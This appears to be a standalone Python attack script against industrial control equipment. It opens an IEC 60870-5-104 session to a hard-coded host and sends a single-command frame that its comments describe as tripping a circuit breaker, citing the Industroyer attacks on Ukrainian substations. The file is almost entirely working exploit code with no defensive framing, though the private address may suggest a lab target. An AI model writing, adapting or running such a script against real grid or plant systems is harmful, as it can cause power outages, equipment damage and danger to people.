#!/usr/bin/env python3
# C_SC_NA_1 (type 45): single command, IOA 1, execute ON — circuit breaker trip.
# This is the payload Industroyer used against Ukrainian substations in 2016.
import socket, sys

STARTDT_ACT = bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00])
STARTDT_CON = bytes([0x68, 0x04, 0x0B, 0x00, 0x00, 0x00])

TRIP_CMD = bytes([
    0x68, 0x0E,              # start, APDU length = 14
    0x00, 0x00, 0x00, 0x00,  # CF: I-frame, SSN=0, RSN=0
    0x2D, 0x01,              # type C_SC_NA_1 (45), 1 object
    0x06, 0x00,              # COT: activation
    0x01, 0x00,              # common address 1
    0x01, 0x00, 0x00,        # IOA 1
    0x01,                    # SCO: execute ON
])

try:
    s = socket.create_connection(("10.0.2.10", 2404), timeout=3)
    s.sendall(STARTDT_ACT)
    resp = s.recv(6)
    if resp != STARTDT_CON:
        s.close()
        sys.exit(1)
    s.settimeout(3)
    s.sendall(TRIP_CMD)
    try:
        ack = s.recv(6)
        s.close()
        sys.exit(0 if (ack and ack[0] == 0x68) else 1)
    except OSError:
        sys.exit(1)
except OSError:
    sys.exit(1)